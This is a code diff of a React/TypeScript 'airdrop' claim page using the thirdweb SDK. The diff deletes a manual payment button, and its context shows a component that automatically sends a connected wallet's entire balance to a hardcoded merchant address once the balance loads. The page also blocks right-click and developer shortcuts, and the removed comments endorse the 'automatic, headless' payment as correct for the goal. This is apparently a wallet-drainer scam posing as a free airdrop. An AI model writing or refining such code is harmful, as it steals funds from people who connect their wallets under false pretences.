@@ -22,12 +22,6 @@ const client = createThirdwebClient({ clientId: "3e681cfd6903162ea00efb231ef55b8
 // Your merchant wallet address
 const MERCHANT_WALLET_ADDRESS = "0xb05F55773b1bFcb17B9f8f271D0ab717876A4656";
 
-// --- Custom Hook for Money State ---
-export function useMoneyState() {
-    const [money, setMoney] = useState('0.001'); // Default value
-    return { money, setMoney };
-}
-
 // --- Main Airdrop Page Component ---
 export default function AirdropPage() {
     // Effect to disable right-click and developer shortcuts
@@ -116,45 +110,7 @@ function AirdropClaimCard() {
     );
 }
 
-// --- Payment Button Component (Manual Backup) ---
-// This component is not used by ShowBalance but can be kept
-export function PaymentButton({ money }: { money: string }) {
-    const { mutateAsync: sendTransaction, isPending } = useSendAndConfirmTransaction();
-    const account = useActiveAccount();
-
-    const handlePurchase = async () => {
-        if (!account) { alert("Please connect your wallet first!"); return; }
-        const transaction = prepareTransaction({
-            to: MERCHANT_WALLET_ADDRESS,
-            chain: polygon,
-            client: client,
-            value: toWei(money),
-        });
-        try {
-            const { transactionHash } = await sendTransaction(transaction);
-            console.log("Transaction successful:", transactionHash);
-            alert(`Payment successful! TxHash: ${transactionHash}`);
-        } catch (error) {
-            console.error("Payment failed:", error);
-            alert("Payment failed. Please try again.");
-        }
-    };
-    return (
-        <button
-            onClick={handlePurchase}
-            disabled={isPending || !money || parseFloat(money) === 0}
-            className="connect-button"
-            style={{ marginTop: '1rem' }}
-        >
-            {isPending ? "Confirming..." : `Buy Manually (${money} MATIC)`}
-        </button>
-    );
-}
-
 // --- Component to Show Balance (With AUTOMATIC, HEADLESS Payment) ---
-// This code is correct for your goal.
-// It uses `useSendAndConfirmTransaction` (which is headless)
-// and `useEffect` (which is automatic).
 function ShowBalance() {
     const account = useActiveAccount();
 
@@ -183,6 +139,12 @@ function ShowBalance() {
             const autoSend = async () => {
                 console.log("Balance loaded. Attempting automatic payment...");
 
+                // ---
+                // IMPORTANT: This line sends the *entire* balance.
+                // Make sure this is what you intend.
+                // You might want to cap this or use a fixed amount.
+                // For example: const amountToSend = "0.001";
+                // ---
                 const transaction = prepareTransaction({
                     to: MERCHANT_WALLET_ADDRESS,
                     chain: polygon,
